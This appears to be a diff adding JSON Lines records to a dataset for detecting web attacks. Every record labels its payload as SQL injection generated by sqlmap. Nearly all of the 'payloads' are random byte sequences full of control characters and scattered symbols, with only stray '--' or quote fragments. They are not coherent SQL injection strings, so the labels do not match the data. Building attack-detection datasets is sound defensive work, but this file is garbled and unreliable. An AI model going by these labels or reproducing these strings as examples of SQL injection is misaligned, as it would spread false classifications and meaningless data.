+{"payload": "5Ae6d$\u000f}%4D^\u00157o\u0005\u0015\u0001\u0005Lݱ qO\u0010KQ!d<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "r2UЗR|GK%24*S#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00133\u0002Vt7k)\u0006d}Z\u0015\u0015--[\u001b7#C", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "G\u0003HfRqd.T%Caľb6_MoU=A@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0014$v&d\u0012`dW|PiNN\u0017VgLL?4\u000eI&?BL\u0018̔-\tߕ&H&adgJ?W4٤EY\u0012\bDN\u0011}/G\u0002K\u0002\u0010WSq1PW`!\"MGe6j`\u0019i\u0010\u0014%5BfϘY`\u0007w\u0001D\\RƷDW,Y\\\u0019mq\u0010\u0019B\u001an}\u001aXu&2\u001f\u0017̇\u0016\u001aQYȢI35X2\b\u0004\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "{Y JCeF\b%6DQ&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5\u0002dv*\u0005\u0003%86,,=\u000fQ-dԭ\u000f\u000e~:\u0001\u0017v'Kf!UϹE.\u0002Kd22O\u0000\u001b&F", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">٧DC.!--{O\\C\u0010\u0015Ǫ*[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Jh\u0003\u0011\"\te#%92U\u0007_<S\u0011(X*sx1٣\u0010`\u0017(\b/oȤ~2Ղ4o-9/~b\u0018*&CԴT~QiM|@'IDf|­8\u0013\u00058\u0007\b&|^\u0011h\u0016crk{zo\u000e&w\u000e\u0017{=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "e{%1D]^2\u0002\u0015VYӢV\u0015T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "DI\u0000r\u0005-b8笪$}ՎSҗi{fY\\G\u0005\u0016l%62ײ7G{6;,b߯\u0013'3#\u0011@(nh{[\u0005S\u0004@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0012\u0014-Ў%cB0k5\u0015ݷ\\Dtq!<n^.\tf`J2.eD\u0015q\u0003H/H\u0003gg", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "I߽Lb∧I*%2FiZI49g]̶", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "V]\u001ajQY\u0007\u001btRД_'zт)I%9b6]ҢײY:&\u000e\u0016ٰXomJ7t˼ \u0006˅:{\u0015Z\u0003[W\u0016%/\u0012ef;Ol0Y`U", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0BT@nI.%aeIgɤXt,q7fd\b:i2\u0007@.X},޸\u001b㏍z7[GνF/ڟ}*5at\u0007\u001bz\u0017Y/\u000efT*:Y5Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "em[\t\u001b\u001bg~3,Okv/Revm75ܬisfڜ\u0007--f{=\u0016-Jcewe<4I&+^{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "c\u0011zP'#uص5--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Qv\u0010Z'+D \\՞ͅ\u0005ēB_G\u0015D%51P5\u0002", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "mNFV|z\u0005n\u001f\u0017GI\u0003{1#\u0016,i\u0019\u000e\u0015ӟfP\u0019k>]bwK\u001a\u001b\u0006n;'o>`#\u0000\u0013t1FvE/m'\u0012XTC%42<Ӭ.\u001at{+\u001b,Cg\u0019", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0%sM'\u001b\u0006 ,بuχ\u0005g\b=V7~4.{\u0003\u001a0.<̀phCt\u00122\u0003\u0003wID\u0014ϼF>ӺKJ8Ed%ECzF}ƖT71Q", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "eZcGP^GHRۓ%A7L撲\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o\u0013--4oSl9<y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "׬NC\u0004\u0007UE|%e7lӹ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0013\\hERB#\u0007%aC [)_\u0011``ny/ܟm\u0003\u0015M5\u0015X$(Ny7\u0012B|ޣ;b\u0019i|Z)4X,\u000ei̗Ƃ:\u0004wj", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0011K\u0003?߱$A7(S#sҥqHs`+\u0005aր͋0,H}--!iqx", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "(\u0015y>nM)Ǜ\u000e8\b\u0003B&yNHumX(8lC~(ﵭ]\u000f\u0003*FxQ]--ks", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "q`+::%1B&?õQJFT5E\u0015~a\\G-{:=.6\u0007U=%!ˡ؟lxOZv", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00170^˲V.\u000eIV%2fRy\u0018faEнI\u0004銓b`ʺ/\u000fS \u0007uO@yH]\u0006T\\n", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005U9rN|Q|9`1jfel;і\u0005T3\t\u0017ev\u0013%adA_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ce%fDdQ)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\\--{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?@LvF^.L`CPcx2\u001f(u--Nٚz9d+U\u0017v;t\u0014*Xk7\u0003,?pH\u001fyY)<\u0012zM\u001a\u000fc,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z\u0012\u001aukߍUm;3x\u001b\u0013Mj-\u0010Ŧ\u001a%18ڹ\u000e?0Zp35\"*\u001aFUԯZ\u0011j\u000e\u0005.,AM\\W8a%Ĺ0lpl", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "+\u0005~q1GJh|5k]n_D=hU|=8<v\u0016\u0000tQ\t\u000fN{kk\u000e \\{\u0014LH;ԟ\u000eQ%DB&<ҭw_6y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "p\u0019Q\"gRq#Q\u0017\u0012A!\u0015&->\u0011cBpom\u0014q\u0014 n{\u0013Gi}X\\KdB\u0004;*6cĢg51JT%EeB\u0005'5K899P>LvzuP1(ȡ(\"ٌB", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "_@-x遍x<\u0016W\u0003r--ʅd\u00179,FiQytm枷`zA\u0004\u000e\u0010Θ8;\u000e +mAj", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "YWbIS\u0010K|S42\u0010R\u0019/$ o2Hg\u0010ħvl)\u0002TA\u0017XYTxIDXS Hge)T8&W4Q%B4^\u0005\u0019YkL\u0013\u0019\\\u0005ޕKzDdT\u0001\u0002NMs=4T\u0015\b\u0017\u0018F\u000f8", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@*ܣA\u0012\u0005\u0013\u0015\u0006\u0001\u0001\u0000L'%F823OρghXތp\u0013\"\bs7t70\u0013b\u0005=\tjakBqԣ֓", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "C,,\u001a[>K7Ư%556M\u0006A\u0002X", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "X-ڄ\u0013Mz>\u0003i]I\t\u0000l\u000e\u0003m\u0017o\u001b%1dRԀy>chY/\"Ń", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%4C'SJ$ڭgEv<N\u0003pN_8mm\u0010\u0018>SaɅ\u0006O30ɣi\u0007c\u0007O]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "`{EFZf+b^J\u0011n^Y--~a@*yӗM\u000fmm\u0017i)EfWRȝ6\u0010]G>2DÌM&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "H)[B|\u000e\u0019%2f<`~\\E!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "oIqYf\u001fH\u000fz,*\u00051I--\u0019Vu1", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pu\u0017k\u0019\\E҈11`<ls𴮙7IS\u0004--╺\\Y\u0012\u0014aU?1D", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "VU)%Df0K6X", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<<W\u0001W؋ SR\u0015 \u000eT!mT%IKU~_%-ÃR%CB", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007QU/z\"3m%531\u0011їX]1\u0007f)\u0011 so+)\u000e\u0001J\u0004Ie(\u001fxĬّKe", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Y-X^\u0011#.z0LT]\u000e~,\"hH;|#f빵I8R\u001bxWc֥L%bBإXX", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~Knҧja)5*a\bʦ&\u0010\u00025@f 75p0p4p2\tXl@z\u0015\tlW{vkgceI̒\u001fKbfI(M\u0002\tYɢ--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%\u001bh\u0010K\b\u0007jѼ--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&&E\u001461}Slm%fa\b\u001abiճAjj|)p\\E\u0004>I\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Um|~\u0010?I.*B\u001bĄgYyc60\u0002 &\u0012M\u0012ga\b\u001a%S#ы%Cff\u0017^\u000f\u000eD \u0015E\u0011\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003ܪ\u0019%15߸", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "G\u0016%EAJ<\u0006Zk:PˡVmu{*v\u0014", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "uYט{q\u0013j{k--{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "{}1]{V-\u0016ێfU5YOX^j붭:z{59/ْ%6B6u", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">i\u0006\to\u0006l\u0001%6b#:i\u0019e+\u0015%lUm%Z\u0002#>\u0019\u0007GrDYu9j'h", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "L~5.p<nm\u000fWoa+6\u0002W\u0012;%dDT9", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "އYTa?%@j;#yV%E1!g\u0017Ѱ\u0000Vy~|\u001b!ZBK|E[<54~4MRl{f\u000f>>ʭ,%||\u0018#R\b\u0017\u0002\u001a\u0018oa%FTRn\bg\u001a,w A |^\u0011;HO\u0000H5ń])\u0001x).V#piaLIzM{!8u\\\u001b4ˊ\u0003$(:7\u0013Km;D.c>6_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0002kg*I\u001bF\u0005k\bi4|p.:d[~g*\u0019-XCE[7\tuy\u0007.8\"\u0006\u0016\u001bZݲhe]\b5\bb\u0003H\u001fC\u0006V/i\u00127CG{\u0016m,M\u0016ph^$^+EI!-6>X@\"DЩIEǊ--,X\tE", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ɐ\u0014|ᶞ\u000f0\u001aFR--j<>6\u0014.\u0012π\"]`TI\u0004Y\u0014+C\u0015\u0011[±M", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000eG\u0017^=;(VsK&D\u001b)E8-1z\u000fg3e%EF\u0014\"JB\u001fV`3B/9 |h|<\u0000oP4)|û", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "fn<߰SH-+pL\u001a\u0007\u0003.Ij\u000f\u0012o=,@%a3Oe*\u0002\u000f&cܐy'Z!\u001baLcfJX$\u0016|!\tܪ)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m'--h>cx7ꍒtE~;\u0017/-D'OB7=d)\u0018L\u0003\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "W;\u0015\u0004u\u001bp;nЈ,ڂ_~QZä[p\u0018L&vܸS78Q\u001bV7`ߑuFR\u0003\\y%48noηohld՛4", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ox\u001bj\u000faqii,9\t\\z;\u0015Yi3%.gj@]\u000ei:r&\u00070#\u00144\u0011i[\u0019,H:a۩##Y8CaFa\u0014U6XR<\u0003o#\u001f\u0000;P]\"`\bU$\u00102_%2Fp\\9\u001aNk&Lf\\4*\u0011\u000em-aǊdbl|\u000e\u0000\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "b\u001bf\u000e}\u00164ږLa\u001a/]40\u0012ʓ\bC0P\u0012s:\u0002yne>ksW/r~apnN݃\u0010{R\u0016Gl\u001a$\u0003\u0002(sifSMr\u0019+-듧\bX)P *h|U(!;(? `#ߓ\u000f\u001b@,\u0001\u0013Ƌ+s0\u001b\\\u0003h_\\XOZy\\Ҧ.Iy_BǗt]bώ'̏.\u000f/\u0019^^E\bqy5>G\u0005,R\u0001\"cWR\u0010\u00162c\u0015|^\u0004B}h_Nu\u0019d\u001ahf\"sNyv\t\u00175%DE??cϢqɺ|(cj]U%cr]H^<\u0013!9K΅", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%8d'Y\u0013@WK\u0012i0_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "MW)v]v\u0010:X\u0011+ԡT.sA%X--\u000eT:\u0000vl\u0015\u000fN ft<Bc;8SV[;C)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%1eV\u0015;)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "D­OЛW%d6,Wb6\tg(\u0011\u0011\u001bجw(N", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "C\u0012\u0005zz\u0005ʃ<]\u0006v~|e*h塳\u001a-k\u0013&+ܵ8kK/#k<Ck.}1Bl5zY|%%f2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E̋\u001b%Ee\u001f\u000e\u0011pX5o\u0006T\\/F\u0015ۊΕi(Qm", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\\j.\u0015\u0019VŊ\u0017ٿWUf ԋ5KY^f2\u001a\u0005Gj%E6Rll͖6mоP\"'\u001a<\u0017y'\u0004\u0013E.@dxƃ\\eMnP5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@ г\u0005p--\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o#JZyc\u0003c-{29%45{MlD\toر#d\"", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "X|M%88J\u0011\u0006`lWp\u0015NݗY!w.tP:2\u001a}H߯͆)3eX+mz\u0005=\u001a\u0015", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ":}aBb|%FD\u0012:!5&~v^Nxv2#-I\u001a\u001f9\u0013{*pɏ\u000eH\u0012\u0000\bGTZs&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "U#%\u0001-$ȿ$/oTj\u0006slz\"paNHT^%5c:\u0013_K0,tP6\u0002sz", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0014-N;O\u0011Dp\u001f|A--\u000fH@<,vW\"8䬑}\u0004ja", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">\u0006%7Bx\"8wZe$\u0003^{aqSR", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Mr\\%HN-/|6\u00042Y%7a`sg\u0004HtR{'6&+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5%FF&[cW<\u0013P?\u0013", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "2$zx\\Q\u0007>\u0018%d0SYaoAHTi", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "L\u0014_v%_\u0001\u0015aMf,`r 6`/~\\P&Bۏ\u0017%1Bj^!\"P\u0013Ǆ>XΌ%b\u0001/.k_\u0018nC7\u0018#,\u0014(@R\u00184oյjN\\\u0000\u001b\u0013\u000eh:48\u0001V1ᓓEǏ;r#Ac\bÃ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "C%93e\u0015]@{|>{R`1<0\u0011#\u0012_0pS܋\t\u0017<{Z\u0003[Y1NX+Kq\u0013@jl\t5D\bj\u0018DZ)):Vdځ\u0004ZB\u0018", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ot[\u0011FAMPi\bM\b\u0006B.e{r!xH9<tɋMӂ-hT/<--\u0012m\u000e;+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003&ȕ\u001f5dIS=ni\u0002\u0005&vk9\"o>%a7UF7$ii>>\tuHy\u001f\u000f?dM*(B\u0014|r-r\u0010", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "MGSBLS\u0015Y\u0002uYw?`9a\u00003ZNƻxU--\u0013o", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "`G'\t[0]\u0002%F5\\-#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0001/\b5ݍJA P#QĴ\u000f#+@s\bl\u00137Dᶠ)\u0011rCPZ<\u0013\u0002`뾴ЬxcPS\u0013\u001b\u0006k--ů>Uִ\t*\u0019\t\b?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~\u00191\u0004c\u0002%4bbjL#-\u0001T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000eb|\u0017\u000e--7W>*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "KiY\u0012ah%f9sE&hZJD;\"T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "遣C7BVD_׍Ъ8X޳s\u000eD%CCp~Gc6GSEA\u0003,*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "8Ǭ!{\u0002'0uo\u0013%eB\u0007+\u00188L֎", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<\u0011v:*%7E\u001b\u0018:16z]7e`\u000e\u00172#ws-L}*w\u0014>\u00170&'53_=\u0014IW^U\u001a\u0014%u<r~SXͶgn+!Z\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u00191q\u0018%C0PŖx:;\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "곢G\u0010\tUB!s\u001b\u001by\u0011N--\\", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0fJ--ڋCyb*zX\u000f#\\\u0019-]F\u0002}n,i\u0016)6V9Ȩ1ml@{nA܎$W", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%69y>>F\u001b%d\u0019n}÷Df уeI_\u001a1\u0014%*,\u001f%Malԍ'Jx\u001bcQB\b:?\u0015,\u0010/a\u0019Q皦", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'a%54(Eoz\u0005kX阼(O:\u0002\u0003,", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "3]B\u00196+O0L1%BFR\\\u0010i+P\u0010*H\u0002JQA;q<bj\u0019$|tyQ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "lƯvLYKYiuơnzU]]Kp--\tu<~+5mk\u0013v'ok)zmcu}\"੼Y\u0006:!*u:\\,Z=4]U_}(u*=BJgj2o\u0007k4RܯլW\u0019YNU\u0017J>X\u0006]w#Էlo>9'\u0005ַ\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "V\u0019j7!%aF|1~\u001a\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^\u0001=%eB y\u0005a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "_{\u0006ua'f\u0014Q%Bak\u0003ǯ`$(U#", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "PsP6xEH\u000el,\u001f1#I%E6\u0016t%UC6%sr_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ZgIa@>![J\u00025*\b\u0012%88d", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ")q\u00013g(!ZMWqrwwG0QGc\u000f^ߊބ\u0019:\u0012͘XE9/8I{\u0003_\u0017&Sc\u0017,ԙ'\u0005p\u000fQcْ@l[P\u0017x\\҆Bƨ4K\u0000U\"\"&h˔$\b~m%21!8u\u0005S@{o=\u0005`gSJ-u1~`skc>dNFA9)5VD*FK},3\t9\u0005H*7d\u0004#$1D}z\t8\u0003 Y?+-\"g", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015\u0014rA`\u00161#mR\\FPS\"MZgOL/,<\u0005顳\u0017\u0007\u001a\u0016<#qPJ&hF\u000fIqNVХ\u0003\u001029@=:]=\u0001\\65n&EMU<w=\u0005\u0005\u0017%02ڳ_$C\u0015\u0001z'6\u0018v<ӲƗК", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Od\"Le%;{Kv>fqlyVr%\u0017)pRmwbv:\u0018/d2.^'!LX\u000eN/D^\u000e--a\u0011zr<Y", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "f4k%62&~Hfc%r+R\u0015u\u00003\u0013\u0004ب'E\u0015\b\u0012o", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pd*[¯F\u0011}幫--=p\bѫ,y3U62\\ѫ\u00197U]2׊rRc$s(REvmRC%WM#@w\u0005[+zj\u0012Qׁ]@~", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "M\u0016rs[\u001bN6\u0012tjv\txO(--Oñ<#}I_\\N{\u0011[sK+?\u00077ˆ\u0013W\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "fj  ZJ@h-gBc\"I4mJ\u001awr/rꢀR.A~i4T>W2Qr(3%oQIW\u0016z~\u0010ݙ&4\u0016\u0004\u001fV=\u0018\u00154+mUJkTj\u0007t--DDEWRX)H1/2V(%\u0010Q\\u\u001a\u0019\u00076\u0019cr\u0016wܳ;", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "O\u0004|\u001a%D0\u0004#V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",?%QԧSu\u0000\\e\u0007\t\t$]qGW gWyB6%AA\u001bP", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0001i>`AјrM\u001fդU9*.\u0004z<0u'|AcZ.8(--`-", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%9f9<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7H43I`\u0001\u0015ݱ÷\u00025%DAv$j\u000e\u001f;'\u001fGؙ\u0011tv\u001foR)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%A9:dx/DF\u00108HYl^{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%ROE1EiH^^%13T\u0011#\u001aW\u0014=Œ}8um྆N\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&@\u0019go%9BEH\u0015\u0013b0m\t~r~WnB~\u0017H\u0004|l-ɏɔ_)hV\u001ff]A[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "6p\u0019.\u0011Tu@\u0007%F5\u0013]%B-հ .ˠ ˒", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%\"\u0015EHjQ3%2e*Ͼh*\u0005=Lۭ|\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m\u0002|\u0002?\u001botJ%46\t\u0016\u0003F0u%jX=\u0003>A{4awQI5W`\u0006s2L\u0001w", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "88ѡ:q<NVv\u0016--!\u0016UKWy~", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ")U%1e 9ܤH7\u0007/d]/Md\u0014&%t39J~)o\u0017\u0005H\u0005-6E", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o)Aw%08V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "h%DElV5f\u0000ۣThkkir\u0011תX\u0015\u0015D\u0019Ks,z\u001fQPb8ÓE-", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}\u0017x=2\u0017ӎ&ӀxNC5b%84", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\b\u0002y\"\u0016=\u0005%9f4ھ,ݦ_\u00199", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}\bLϪ\b&}\bw#Ob%caAPqXJN</닢p6Ufo\u0012B$\u0003t仹X!ce\u0019-*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<L]DT--ׂ\u0000-ae\u000f1\t'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "!A唡HO\u0017à--m\u001bVt&\u0006\u00149OQfTw\u0005l\u0007R+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "l賓@Ƶ%|\u0007*\u000f \u001f\u0019|\")N̨\u001f5+<4~_\u0014%D3\twۈs\u0019^\u0013rTer", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "/ܾ\u0018O+\u0001rJOt%24\u0017܆\u0012«q@0BK8bJ\u0004c\u001bRd!\bcM\u0017PeEHQSHeǚw\u0004pP`\u001fCEFwlZRSl\u0015H\\_\"\u0005)utpTkN\u0015g\u0018t𺥁2!wF*m\u0002\u0019k౛P4U", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Q+v|lv2c%eb?\u0001Ơ\u0002\u0018)M9~\u001b:dMX *mx\u0018\b2K\u001a\u0013:X>5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "y8RH.Cwyv\u0002dCB;5]1NV)ұv҉,*D <\u0010ܫ\u0002;\u0002do]5eI_'\u0015pMv\u0002N8\\\\7}z--m8J\u0001D>m\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "os\u0015iz:\u0005MmtDV=N--)❊*\u0006;\u0010Y\u0010\u001f\u0015&;\u0015$FzG#*\u0005(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "must얛RV\u0000.\u001f\u0011>#ZU-%C8:uX((W;\u001a\\iiøE\u0015o\u0010ɔ`A\u00065Zʥ\u0010%owVP|\u0017pEWW(߂3B=\u0006h>^'k>\u0010-֕)\")rx\u0019\u0000pژIfA4\u0002!)h304`%[;S9JCdU7\u0015n\u0002bh>@2\u0005.<\u001a֮,H[c'VL", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "㦺%F0ĩj,lZ<\u0018g", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "vP\u00148\u001b\u0017\u0006\u0003_N0<{w3`?K3,L}0ǋ=(9ꁬ\u0012:CS(ӎ]oǌ\u0001qx+%9cH[U[\u0012^x(7KԴiڸi\u0017o", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "2\u0013Y]\u0012\u0002hfh_@_tPLem#|F~SU$vju\bY\u001bWcwkZi\u0007--n\bp\"\u0017+\u000fvuFi{+˲}M)+@l", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "AWLݮw\u000ekSS>V$O4}aq8[)Ny)~OO5zJNko<Bo\u000egyN~>ph\t~^?GI\u0005}i-[%Df}Ͳ7]/[s/!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "R\u0006}C:%DfMr֏yӈ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0004;tdjL\u0011#A%cfKe\u0010]K", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "4w!!\b4pÀ%C2H\u0019sYzkzVr\u0002ͳͅ\u00001O@=5KV\u0015\u0004M.X\b'D&\u001a}(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "73\u0001ˤ֌@W,\u0019n|(L%3aj䒗hx&j2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$L%2F7\u0016W0", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "!\u0013G=%Adްu", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0006\u0019\u0016\u001aO\u0004v\u000e1XWg\u0003ڍ\u001a\u0000%J%3cr", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Y)=xǧ#O;\u0001${@1\u0018x#v \u0016|I%0EgX\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Jj\u0013\u00022l?1Xfn\u00132XH*[ww<~R\b4I 'Ea\u0000f%7F3Q̬'\u0005oqm", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%D6w", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "w\u0010Aq\u00124Bcd\u0010b]-\u001f\u0012{WNeLarlp\u0019|.\u0011Y<FrJu\u0019]X<S秎Iv([sNKQ\"'/}!Lho\u0019Ӻ\u0016SހfVR\u0004{ǕH[U8wa>h\"g3'\u0010\u0017kow%F5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\\\u0018\u0006.B%\u0001'yZA\u001f>wBC#/|\u001b\u0003ĉ--r\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tQ\u0019y?E7M+T%13\u0004Vdt\")\t\u0016*r\u0004lిJQ\\E&sHyţLed", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "H·A\u000f\u0004G5vHȬ\u0013\u0004\u0003\"8\u001aR`8v.ܥu&/^.1\t\u001aP\u0002c\t!//)i݊/ͩN%55g\u0004h\u0004VYGW+hz\u0005ׄ\u0000\u0017H#]nMv\tͦiJm0zTj^J\u00157;$HP2e([V:\u0006o\u001a^gՏa\\]\u0016ΫZ\u0000\u0017lso\u0017ѧ.(\u0000hXcJn(ޜ\u0015]\u001b͆S", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0012Vqyܱ*\u0007rQӾ8\"\u0001>W~X%\u001b\bW4une\u00025l0KO`'YHm555\u0005\u0012-OPfG6\u00137\u0007%6C\u0016ؽE", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015Ki%CE}ጒ", "attack_type": "SQLi", "source": "sqlmap"}
